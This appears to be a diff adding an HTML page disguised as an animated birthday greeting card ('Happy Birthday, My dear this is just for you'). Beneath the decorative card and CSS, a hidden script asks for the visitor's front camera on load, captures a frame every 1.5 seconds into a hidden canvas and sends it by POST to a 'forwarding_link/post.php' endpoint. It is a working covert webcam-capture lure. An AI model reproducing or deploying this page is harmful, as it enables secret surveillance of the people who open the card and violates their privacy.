@@ -1,0 +1,376 @@
+<html>
+<head>
+<!----)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))script(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((--->
+<meta content="width=device-width,height=device-height,inital-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport">
+<div class="card">
+  <div class="back"></div>
+  <div class="front">
+    <div class="cover-shape-large">
+      <div class="shape-diamond"></div>
+      <div class="shape-block"></div>
+    </div>
+    <div class="cover-shape-small">
+      <div class="shape-diamond"></div>
+      <div class="shape-block">
+        <div class="cake">
+          <div class="layer layer-bottom"></div>
+          <div class="layer layer-middle"></div>
+          <div class="layer layer-top"></div>
+          <div class="icing"></div>
+          <div class="drip drip1"></div>
+          <div class="drip drip2"></div>
+          <div class="drip drip3"></div>
+          <div class="candle">
+            <div class="flame"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="text-container">
+    <p id="head">Happy Birthday</p>
+    <p>My dear this is just for you.</p>
+    <p>Hope your day goes great!</p>
+  </div>
+</div>
+<style>
+@import url(https://fonts.googleapis.com/css?family=Nobile:400italic,700italic);
+ html, body {
+	 overflow: hidden;
+	 background-color: #bf737d;
+	 width: 100%;
+	 height: 100%;
+}
+ .card {
+	 position: relative;
+	 width: 300px;
+	 height: 425px;
+	 border: 10px solid #73bfb5;
+	 margin: 50px auto 0 auto;
+	 box-shadow: inset 10px 0px 15px 0px rgba(0, 0, 0, 0.1);
+	 background-color: #e6f0e6;
+}
+ .card .text-container {
+	 width: 80%;
+	 height: 80%;
+	 margin: auto;
+}
+ .strikethrough {
+	 text-decoration: line-through;
+}
+ .card .text-container #head {
+	 font-family: 'Nobile', sans-serif;
+	 font-size: 1.5em;
+	 margin: 60px auto 60px auto;
+}
+ .card p {
+	 font-size: 1.1em;
+	 line-height: 1.4;
+	 font-family: 'Nobile';
+	 color: #331717;
+	 font-style: italic;
+	 text-align: center;
+	 margin: 30px auto 0px auto;
+}
+ .card .front {
+	 position: absolute;
+	 width: 100%;
+	 height: 100%;
+	 margin: -10px 0px 0px -10px;
+	 border: 10px solid #73bfb5;
+	 backface-visibility: hidden;
+	 background-color: #73a3bf;
+	/* background-image: url($cover-image);
+	 */
+	 background-size: contain;
+	 transform-style: preserve-3d;
+	 transform-origin: 0% 50%;
+	 transform: perspective(800px) rotateY(0deg);
+	 transition: all 0.8s ease-in-out;
+}
+ .card:hover .front {
+	 transform: perspective(800px) rotateY(-170deg);
+	 background-color: #41718d;
+}
+ .card:hover .back {
+	 transform: perspective(800px) rotateY(-170deg);
+	 box-shadow: 7px 0px 5px 0px rgba(0, 0, 0, 0.3), inset 2px 0px 15px 0px rgba(0, 0, 0, 0.1);
+	 background-color: #d2dcd2;
+}
+ .card .back {
+	 position: absolute;
+	 width: 100%;
+	 height: 100%;
+	 border: 10px solid #73bfb5;
+	 margin: -10px 0px 0px -10px;
+	 backface-visibility: visible;
+	 filter: drop-shadow(2px 2px 4px rgba(0, 0, 0, .5));
+	 transform-style: preserve-3d;
+	 transform-origin: 0% 50%;
+	 transform: perspective(800px) rotateY(0deg);
+	 transition: all 0.8s ease-in-out;
+	 background-color: #e6f0e6;
+	 box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.1);
+}
+ .cover-shape-large {
+	 position: absolute;
+	 width: 65%;
+	 height: 48%;
+	 top: 25%;
+	 left: 18%;
+	/* transform: rotateZ(45deg);
+	 */
+}
+ .cover-shape-large .shape-block, .cover-shape-large .shape-diamond {
+	 background-color: #73bf8f;
+}
+ .cover-shape-small {
+	 position: absolute;
+	 width: 50%;
+	 height: 36%;
+	 top: 30%;
+	 left: 25%;
+}
+ .shape-block {
+	 position: absolute;
+	 width: 100%;
+	 height: 100%;
+	 background-color: white;
+	 border-radius: 50px;
+	 box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.5);
+}
+ #shape-image {
+	 background-image: url('http://freedesignfile.com/upload/2013/02/Birthday-cake-vector-4.jpg');
+	 background-size: contain;
+	 background-repeat: no-repeat;
+	 background-position: center;
+}
+ .shape-diamond {
+	 position: absolute;
+	 width: 100%;
+	 height: 100%;
+	 background-color: white;
+	 box-shadow: 0 0 10px 0 rgba(0, 0, 0, 0.5);
+	 transform: rotateZ(45deg);
+}
+/* cake animation stuff from: https://codepen.io/WithAnEs/pen/OVZRvg not created by me! It's by Mark Thomes. */
+ .cake {
+	 position: absolute;
+	 width: 100px;
+	 height: 80px;
+	 top: 45%;
+	 left: 50%;
+	 margin-top: -28px;
+	 margin-left: -50px;
+}
+ .cake > * {
+	 position: absolute;
+	/* backface-visibility: hidden;
+	 */
+}
+ .layer {
+	 position: absolute;
+	 display: block;
+	 width: 100px;
+	 height: 40px;
+	 border-radius: 50%;
+	 background-color: #553c13;
+	 box-shadow: 0 2px 0px #6a4b18, 0 4px 0px #33240b, 0 6px 0px #32230b, 0 8px 0px #31230b, 0 10px 0px #30220b, 0 12px 0px #2f220b, 0 14px 0px #2f210a, 0 16px 0px #2e200a, 0 18px 0px #2d200a, 0 20px 0px #2c1f0a, 0 22px 0px #2b1f0a, 0 24px 0px #2a1e09, 0 26px 0px #2a1d09, 0 28px 0px #291d09, 0 30px 0px #281c09;
+}
+ .layer-top {
+	 top: 0px;
+}
+ .layer-middle {
+	 top: 13.2px;
+}
+ .layer-bottom {
+	 top: 26.4px;
+}
+ .icing {
+	 top: 0.8px;
+	 left: 2px;
+	 background-color: #f0e4d0;
+	 width: 96px;
+	 height: 36px;
+	 border-radius: 50%;
+}
+ .icing:before {
+	 content: "";
+	 position: absolute;
+	 top: 4px;
+	 right: 5px;
+	 bottom: 6px;
+	 left: 5px;
+	 background-color: #f4ebdc;
+	 box-shadow: 0 0 4px #f6efe3, 0 0 4px #f6efe3, 0 0 4px #f6efe3;
+	 border-radius: 50%;
+	/* z-index: 1;
+	 */
+}
+ .drip {
+	 display: block;
+	 width: 20px;
+	 height: 24px;
+	 border-bottom-left-radius: 25px;
+	 border-bottom-right-radius: 25px;
+	 background-color: #f0e4d0;
+}
+ .drip1 {
+	 top: 22px;
+	 left: 2px;
+	 transform: skewY(15deg);
+	 height: 19.2px;
+	 width: 16px;
+}
+ .drip2 {
+	 top: 30px;
+	 left: 72.4px;
+	 transform: skewY(-15deg);
+}
+ .drip3 {
+	 top: 33.6px;
+	 left: 36px;
+	 width: 32px;
+	 border-bottom-left-radius: 40px;
+	 border-bottom-right-radius: 40px;
+}
+ .candle {
+	 background-color: #bf737d;
+	 width: 6.4px;
+	 height: 20px;
+	 border-radius: 8px / 4px;
+	 top: -8px;
+	 left: 50%;
+	 margin-left: -3.2px;
+	/* z-index: 10;
+	 */
+}
+ .candle:before {
+	 content: "";
+	 position: absolute;
+	 top: 0;
+	 left: 0;
+	 width: 6.4px;
+	 height: 3.2px;
+	 border-radius: 50%;
+	 background-color: #cf969e;
+}
+ .flame {
+	 position: absolute;
+	 background-color: orange;
+	 width: 6px;
+	 height: 14px;
+	 border-radius: 10px 10px 10px 10px / 25px 25px 10px 10px;
+	 top: -13.6px;
+	 left: 50%;
+	 margin-left: -3px;
+	/* z-index: 10;
+	 */
+	 box-shadow: 0 0 10px rgba(255, 165, 0, 0.5), 0 0 20px rgba(255, 165, 0, 0.5), 0 0 60px rgba(255, 165, 0, 0.5), 0 0 80px rgba(255, 165, 0, 0.5);
+	 transform-origin: 50% 90%;
+	 animation: flicker 1s ease-in-out infinite;
+}
+ @keyframes flicker {
+	/* transform: rotateZ(5deg);
+	 */
+	 0% {
+		 box-shadow: 0 0 10px rgba(255, 165, 0, 0.2), 0 0 20px rgba(255, 165, 0, 0.2), 0 0 60px rgba(255, 165, 0, 0.2), 0 0 80px rgba(255, 165, 0, 0.2);
+	}
+	 25% {
+		/* transform: rotateZ(-5deg);
+		 */
+		 box-shadow: 0 0 10px rgba(255, 165, 0, 0.5), 0 0 20px rgba(255, 165, 0, 0.5), 0 0 60px rgba(255, 165, 0, 0.5), 0 0 80px rgba(255, 165, 0, 0.5);
+	}
+	 50% {
+		/* transform: rotateZ(10deg);
+		 */
+		 box-shadow: 0 0 10px rgba(255, 165, 0, 0.3), 0 0 20px rgba(255, 165, 0, 0.3), 0 0 60px rgba(255, 165, 0, 0.3), 0 0 80px rgba(255, 165, 0, 0.3);
+	}
+	 75% {
+		/* transform: rotateZ(-10deg);
+		 */
+		 box-shadow: 0 0 10px rgba(255, 165, 0, 0.4), 0 0 20px rgba(255, 165, 0, 0.4), 0 0 60px rgba(255, 165, 0, 0.4), 0 0 80px rgba(255, 165, 0, 0.4);
+	}
+	 100% {
+		/* transform: rotateZ(5deg);
+		 */
+		 box-shadow: 0 0 10px rgba(255, 165, 0, 0.5), 0 0 20px rgba(255, 165, 0, 0.5), 0 0 60px rgba(255, 165, 0, 0.5), 0 0 80px rgba(255, 165, 0, 0.5);
+	}
+}
+ 
+</style>
+<!---OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOandOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO--->
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</html>
